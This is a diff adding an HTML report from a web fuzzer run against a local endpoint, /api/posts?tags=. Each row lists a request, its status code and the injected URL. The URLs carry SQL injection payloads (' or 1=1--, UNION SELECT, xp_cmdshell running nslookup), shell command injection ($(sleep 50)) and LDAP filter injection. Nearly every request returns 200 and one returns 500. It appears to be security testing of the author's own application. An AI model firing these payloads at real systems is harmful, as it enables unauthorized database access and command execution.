@@ -1,0 +1,254 @@
+<html><head></head><body bgcolor=#000000 text=#FFFFFF><h1>Fuzzing http://127.0.0.1:5000/api/posts?tags=FUZZ</h1>
+<table border="1">
+<tr><td>#request</td><td>Code</td><td>#lines</td><td>#words</td><td>Url</td></tr>
+
+<tr><td>00003</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=>http://127.0.0.1:5000/api/posts?tags=</a></td></tr>
+
+<tr><td>00009</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags==%20'>http://127.0.0.1:5000/api/posts?tags==%20'</a></td></tr>
+
+<tr><td>00002</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=">http://127.0.0.1:5000/api/posts?tags="</a></td></tr>
+
+<tr><td>00006</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20-->http://127.0.0.1:5000/api/posts?tags='%20--</a></td></tr>
+
+<tr><td>00001</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='>http://127.0.0.1:5000/api/posts?tags='</a></td></tr>
+
+<tr><td>00010</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags==%20;>http://127.0.0.1:5000/api/posts?tags==%20;</a></td></tr>
+
+<tr><td>00004</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=->http://127.0.0.1:5000/api/posts?tags=-</a></td></tr>
+
+<tr><td>00008</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20;>http://127.0.0.1:5000/api/posts?tags='%20;</a></td></tr>
+
+<tr><td>00011</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags==%20-->http://127.0.0.1:5000/api/posts?tags==%20--</a></td></tr>
+
+<tr><td>00007</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=--';>http://127.0.0.1:5000/api/posts?tags=--';</a></td></tr>
+
+<tr><td>00005</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=-->http://127.0.0.1:5000/api/posts?tags=--</a></td></tr>
+
+<tr><td>00012</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x23>http://127.0.0.1:5000/api/posts?tags=\x23</a></td></tr>
+
+<tr><td>00015</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x3D%20\x27>http://127.0.0.1:5000/api/posts?tags=\x3D%20\x27</a></td></tr>
+
+<tr><td>00014</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x3D%20\x3B'>http://127.0.0.1:5000/api/posts?tags=\x3D%20\x3B'</a></td></tr>
+
+<tr><td>00013</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x27>http://127.0.0.1:5000/api/posts?tags=\x27</a></td></tr>
+
+<tr><td>00019</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=admin'-->http://127.0.0.1:5000/api/posts?tags=admin'--</a></td></tr>
+
+<tr><td>00016</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x27\x4F\x52%20SELECT%20*>http://127.0.0.1:5000/api/posts?tags=\x27\x4F\x52%20SELECT%20*</a></td></tr>
+
+<tr><td>00018</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='or%20select%20*>http://127.0.0.1:5000/api/posts?tags='or%20select%20*</a></td></tr>
+
+<tr><td>00017</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x27\x6F\x72%20SELECT%20*>http://127.0.0.1:5000/api/posts?tags=\x27\x6F\x72%20SELECT%20*</a></td></tr>
+
+<tr><td>00020</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=<>"'%;)(&+>http://127.0.0.1:5000/api/posts?tags=<>"'%;)(&+</a></td></tr>
+
+<tr><td>00021</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20''='>http://127.0.0.1:5000/api/posts?tags='%20or%20''='</a></td></tr>
+
+<tr><td>00022</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20'x'='x>http://127.0.0.1:5000/api/posts?tags='%20or%20'x'='x</a></td></tr>
+
+<tr><td>00023</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="%20or%20"x"="x>http://127.0.0.1:5000/api/posts?tags="%20or%20"x"="x</a></td></tr>
+
+<tr><td>00024</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=')%20or%20('x'='x>http://127.0.0.1:5000/api/posts?tags=')%20or%20('x'='x</a></td></tr>
+
+<tr><td>00025</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=0%20or%201=1>http://127.0.0.1:5000/api/posts?tags=0%20or%201=1</a></td></tr>
+
+<tr><td>00027</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="%20or%200=0%20-->http://127.0.0.1:5000/api/posts?tags="%20or%200=0%20--</a></td></tr>
+
+<tr><td>00028</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=or%200=0%20-->http://127.0.0.1:5000/api/posts?tags=or%200=0%20--</a></td></tr>
+
+<tr><td>00029</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%200=0%20>http://127.0.0.1:5000/api/posts?tags='%20or%200=0%20</a></td></tr>
+
+<tr><td>00026</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%200=0%20-->http://127.0.0.1:5000/api/posts?tags='%20or%200=0%20--</a></td></tr>
+
+<tr><td>00030</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="%20or%200=0%20>http://127.0.0.1:5000/api/posts?tags="%20or%200=0%20</a></td></tr>
+
+<tr><td>00031</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=or%200=0%20>http://127.0.0.1:5000/api/posts?tags=or%200=0%20</a></td></tr>
+
+<tr><td>00033</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="%20or%201=1-->http://127.0.0.1:5000/api/posts?tags="%20or%201=1--</a></td></tr>
+
+<tr><td>00032</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%201=1-->http://127.0.0.1:5000/api/posts?tags='%20or%201=1--</a></td></tr>
+
+<tr><td>00034</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20'1'='1'-->http://127.0.0.1:5000/api/posts?tags='%20or%20'1'='1'--</a></td></tr>
+
+<tr><td>00035</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="'%20or%201%20--'">http://127.0.0.1:5000/api/posts?tags="'%20or%201%20--'"</a></td></tr>
+
+<tr><td>00036</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=or%201=1-->http://127.0.0.1:5000/api/posts?tags=or%201=1--</a></td></tr>
+
+<tr><td>00037</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=or%201=1>http://127.0.0.1:5000/api/posts?tags=or%201=1</a></td></tr>
+
+<tr><td>00039</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%201=1%20or%20''='>http://127.0.0.1:5000/api/posts?tags='%20or%201=1%20or%20''='</a></td></tr>
+
+<tr><td>00038</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=or%201=1%20-->http://127.0.0.1:5000/api/posts?tags=or%201=1%20--</a></td></tr>
+
+<tr><td>00041</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20a=a-->http://127.0.0.1:5000/api/posts?tags='%20or%20a=a--</a></td></tr>
+
+<tr><td>00040</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="%20or%201=1%20or%20""=">http://127.0.0.1:5000/api/posts?tags="%20or%201=1%20or%20""="</a></td></tr>
+
+<tr><td>00043</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=')%20or%20('a'='a>http://127.0.0.1:5000/api/posts?tags=')%20or%20('a'='a</a></td></tr>
+
+<tr><td>00044</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=")%20or%20("a"="a>http://127.0.0.1:5000/api/posts?tags=")%20or%20("a"="a</a></td></tr>
+
+<tr><td>00042</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags="%20or%20"a"="a>http://127.0.0.1:5000/api/posts?tags="%20or%20"a"="a</a></td></tr>
+
+<tr><td>00045</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=hi"%20or%20"a"="a>http://127.0.0.1:5000/api/posts?tags=hi"%20or%20"a"="a</a></td></tr>
+
+<tr><td>00048</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=hi'%20or%20'a'='a>http://127.0.0.1:5000/api/posts?tags=hi'%20or%20'a'='a</a></td></tr>
+
+<tr><td>00047</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=hi'%20or%201=1%20-->http://127.0.0.1:5000/api/posts?tags=hi'%20or%201=1%20--</a></td></tr>
+
+<tr><td>00046</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=hi"%20or%201=1%20-->http://127.0.0.1:5000/api/posts?tags=hi"%20or%201=1%20--</a></td></tr>
+
+<tr><td>00049</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=hi')%20or%20('a'='a>http://127.0.0.1:5000/api/posts?tags=hi')%20or%20('a'='a</a></td></tr>
+
+<tr><td>00050</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=hi")%20or%20("a"="a>http://127.0.0.1:5000/api/posts?tags=hi")%20or%20("a"="a</a></td></tr>
+
+<tr><td>00051</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='hi'%20or%20'x'='x';>http://127.0.0.1:5000/api/posts?tags='hi'%20or%20'x'='x';</a></td></tr>
+
+<tr><td>00053</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=,@variable>http://127.0.0.1:5000/api/posts?tags=,@variable</a></td></tr>
+
+<tr><td>00052</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=@variable>http://127.0.0.1:5000/api/posts?tags=@variable</a></td></tr>
+
+<tr><td>00056</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=select>http://127.0.0.1:5000/api/posts?tags=select</a></td></tr>
+
+<tr><td>00057</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=insert>http://127.0.0.1:5000/api/posts?tags=insert</a></td></tr>
+
+<tr><td>00058</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=as>http://127.0.0.1:5000/api/posts?tags=as</a></td></tr>
+
+<tr><td>00061</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=limit>http://127.0.0.1:5000/api/posts?tags=limit</a></td></tr>
+
+<tr><td>00059</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=or>http://127.0.0.1:5000/api/posts?tags=or</a></td></tr>
+
+<tr><td>00060</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=procedure>http://127.0.0.1:5000/api/posts?tags=procedure</a></td></tr>
+
+<tr><td>00063</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=asc>http://127.0.0.1:5000/api/posts?tags=asc</a></td></tr>
+
+<tr><td>00062</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=order%20by>http://127.0.0.1:5000/api/posts?tags=order%20by</a></td></tr>
+
+<tr><td>00064</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=desc>http://127.0.0.1:5000/api/posts?tags=desc</a></td></tr>
+
+<tr><td>00065</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=delete>http://127.0.0.1:5000/api/posts?tags=delete</a></td></tr>
+
+<tr><td>00067</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=distinct>http://127.0.0.1:5000/api/posts?tags=distinct</a></td></tr>
+
+<tr><td>00066</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=update>http://127.0.0.1:5000/api/posts?tags=update</a></td></tr>
+
+<tr><td>00055</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=PRINT%20@@variable>http://127.0.0.1:5000/api/posts?tags=PRINT%20@@variable</a></td></tr>
+
+<tr><td>00054</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=PRINT>http://127.0.0.1:5000/api/posts?tags=PRINT</a></td></tr>
+
+<tr><td>00070</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=replace>http://127.0.0.1:5000/api/posts?tags=replace</a></td></tr>
+
+<tr><td>00071</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=like>http://127.0.0.1:5000/api/posts?tags=like</a></td></tr>
+
+<tr><td>00073</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=bfilename>http://127.0.0.1:5000/api/posts?tags=bfilename</a></td></tr>
+
+<tr><td>00072</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=handler>http://127.0.0.1:5000/api/posts?tags=handler</a></td></tr>
+
+<tr><td>00075</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20uname%20like%20'%>http://127.0.0.1:5000/api/posts?tags='%20or%20uname%20like%20'%</a></td></tr>
+
+<tr><td>00074</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20username%20like%20'%>http://127.0.0.1:5000/api/posts?tags='%20or%20username%20like%20'%</a></td></tr>
+
+<tr><td>00077</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20uid%20like%20'%>http://127.0.0.1:5000/api/posts?tags='%20or%20uid%20like%20'%</a></td></tr>
+
+<tr><td>00076</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20userid%20like%20'%>http://127.0.0.1:5000/api/posts?tags='%20or%20userid%20like%20'%</a></td></tr>
+
+<tr><td>00078</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20user%20like%20'%>http://127.0.0.1:5000/api/posts?tags='%20or%20user%20like%20'%</a></td></tr>
+
+<tr><td>00079</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=exec%20xp>http://127.0.0.1:5000/api/posts?tags=exec%20xp</a></td></tr>
+
+<tr><td>00080</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=exec%20sp>http://127.0.0.1:5000/api/posts?tags=exec%20sp</a></td></tr>
+
+<tr><td>00081</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=';%20exec%20master..xp_cmdshell>http://127.0.0.1:5000/api/posts?tags=';%20exec%20master..xp_cmdshell</a></td></tr>
+
+<tr><td>00068</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=having>http://127.0.0.1:5000/api/posts?tags=having</a></td></tr>
+
+<tr><td>00069</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=truncate>http://127.0.0.1:5000/api/posts?tags=truncate</a></td></tr>
+
+<tr><td>00083</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'-->http://127.0.0.1:5000/api/posts?tags=t'exec%20master..xp_cmdshell%20'nslookup%20www.google.com'--</a></td></tr>
+
+<tr><td>00085</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=\x27UNION%20SELECT>http://127.0.0.1:5000/api/posts?tags=\x27UNION%20SELECT</a></td></tr>
+
+<tr><td>00084</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=--sp_password>http://127.0.0.1:5000/api/posts?tags=--sp_password</a></td></tr>
+
+<tr><td>00094</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=&lt;&gt;&quot;'%;)(&amp;+>http://127.0.0.1:5000/api/posts?tags=&lt;&gt;&quot;'%;)(&amp;+</a></td></tr>
+
+<tr><td>00086</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20UNION%20SELECT>http://127.0.0.1:5000/api/posts?tags='%20UNION%20SELECT</a></td></tr>
+
+<tr><td>00087</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20UNION%20ALL%20SELECT>http://127.0.0.1:5000/api/posts?tags='%20UNION%20ALL%20SELECT</a></td></tr>
+
+<tr><td>00088</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20(EXISTS)>http://127.0.0.1:5000/api/posts?tags='%20or%20(EXISTS)</a></td></tr>
+
+<tr><td>00089</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20(select%20top%201>http://127.0.0.1:5000/api/posts?tags='%20(select%20top%201</a></td></tr>
+
+<tr><td>00091</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=1;SELECT%20*>http://127.0.0.1:5000/api/posts?tags=1;SELECT%20*</a></td></tr>
+
+<tr><td>00100</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=&apos;%20OR>http://127.0.0.1:5000/api/posts?tags=&apos;%20OR</a></td></tr>
+
+<tr><td>00082</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=';%20exec%20xp_regread>http://127.0.0.1:5000/api/posts?tags=';%20exec%20xp_regread</a></td></tr>
+
+<tr><td>00095</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%201=1>http://127.0.0.1:5000/api/posts?tags='%20or%201=1</a></td></tr>
+
+<tr><td>00093</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=tz_offset>http://127.0.0.1:5000/api/posts?tags=tz_offset</a></td></tr>
+
+<tr><td>00092</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=to_timestamp_tz>http://127.0.0.1:5000/api/posts?tags=to_timestamp_tz</a></td></tr>
+
+<tr><td>00096</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%27%20or%201=1>http://127.0.0.1:5000/api/posts?tags=%27%20or%201=1</a></td></tr>
+
+<tr><td>00090</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='||UTL_HTTP.REQUEST>http://127.0.0.1:5000/api/posts?tags='||UTL_HTTP.REQUEST</a></td></tr>
+
+<tr><td>00097</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%20$(sleep%2050)>http://127.0.0.1:5000/api/posts?tags=%20$(sleep%2050)</a></td></tr>
+
+<tr><td>00099</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=char%4039%41%2b%40SELECT>http://127.0.0.1:5000/api/posts?tags=char%4039%41%2b%40SELECT</a></td></tr>
+
+<tr><td>00098</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%20'sleep%2050'>http://127.0.0.1:5000/api/posts?tags=%20'sleep%2050'</a></td></tr>
+
+<tr><td>00101</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='sqlattempt1>http://127.0.0.1:5000/api/posts?tags='sqlattempt1</a></td></tr>
+
+<tr><td>00102</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=(sqlattempt2)>http://127.0.0.1:5000/api/posts?tags=(sqlattempt2)</a></td></tr>
+
+<tr><td>00106</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%2A%7C>http://127.0.0.1:5000/api/posts?tags=%2A%7C</a></td></tr>
+
+<tr><td>00105</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=*|>http://127.0.0.1:5000/api/posts?tags=*|</a></td></tr>
+
+<tr><td>00108</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%2A%28%7C%28mail%3D%2A%29%29>http://127.0.0.1:5000/api/posts?tags=%2A%28%7C%28mail%3D%2A%29%29</a></td></tr>
+
+<tr><td>00115</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=>http://127.0.0.1:5000/api/posts?tags=</a></td></tr>
+
+<tr><td>00107</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=*(|(mail=*))>http://127.0.0.1:5000/api/posts?tags=*(|(mail=*))</a></td></tr>
+
+<tr><td>00103</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=|>http://127.0.0.1:5000/api/posts?tags=|</a></td></tr>
+
+<tr><td>00104</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%7C>http://127.0.0.1:5000/api/posts?tags=%7C</a></td></tr>
+
+<tr><td>00109</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=*(|(objectclass=*))>http://127.0.0.1:5000/api/posts?tags=*(|(objectclass=*))</a></td></tr>
+
+<tr><td>00110</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%2A%28%7C%28objectclass%3D%2A%29%29>http://127.0.0.1:5000/api/posts?tags=%2A%28%7C%28objectclass%3D%2A%29%29</a></td></tr>
+
+<tr><td>00111</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=(>http://127.0.0.1:5000/api/posts?tags=(</a></td></tr>
+
+<tr><td>00113</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=)>http://127.0.0.1:5000/api/posts?tags=)</a></td></tr>
+
+<tr><td>00116</td><td><font>500</font></td><td>   4L</td><td>   40W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%26>http://127.0.0.1:5000/api/posts?tags=%26</a></td></tr>
+
+<tr><td>00114</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%29>http://127.0.0.1:5000/api/posts?tags=%29</a></td></tr>
+
+<tr><td>00117</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=!>http://127.0.0.1:5000/api/posts?tags=!</a></td></tr>
+
+<tr><td>00118</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%21>http://127.0.0.1:5000/api/posts?tags=%21</a></td></tr>
+
+<tr><td>00119</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%201=1%20or%20''='>http://127.0.0.1:5000/api/posts?tags='%20or%201=1%20or%20''='</a></td></tr>
+
+<tr><td>00120</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags='%20or%20''='>http://127.0.0.1:5000/api/posts?tags='%20or%20''='</a></td></tr>
+
+<tr><td>00122</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=/>http://127.0.0.1:5000/api/posts?tags=/</a></td></tr>
+
+<tr><td>00123</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=//>http://127.0.0.1:5000/api/posts?tags=//</a></td></tr>
+
+<tr><td>00124</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=//*>http://127.0.0.1:5000/api/posts?tags=//*</a></td></tr>
+
+<tr><td>00125</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=*/*>http://127.0.0.1:5000/api/posts?tags=*/*</a></td></tr>
+
+<tr><td>00112</td><td><font color=#00aa00>200</font></td><td>   1L</td><td>    1W</td><td><a href=http://127.0.0.1:5000/api/posts?tags=%28>http://127.0.0.1:5000/api/posts?tags=%28</a></td></tr>
+
